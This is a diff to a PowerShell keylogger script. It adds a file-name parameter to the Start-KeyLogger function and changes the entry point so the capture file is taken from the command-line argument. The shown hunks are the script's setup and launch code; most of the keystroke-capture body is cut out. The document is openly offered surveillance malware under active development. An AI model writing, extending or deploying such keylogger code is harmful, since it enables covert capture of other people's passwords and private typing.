@@ -16,7 +16,7 @@ function title {
 
 
 #requires -Version 2
-function Start-KeyLogger {
+function Start-KeyLogger($file_name) {
 
     begin {
         $path = "$(Get-Location)\$file_name"
@@ -79,14 +79,11 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }
 }
 
-function run{
-    
+function run($arg){
     title
-    try{
-        Start-KeyLogger
-    }catch{
-        Write-Host "Error while trying to start keylogging..." -ForegroundColor Red
-    }
+    If ($arg) {
+        Start-KeyLogger($arg)
+    }else { Write-Error "Please specify the file name..." }
 }
 
-run
+run($args[0])
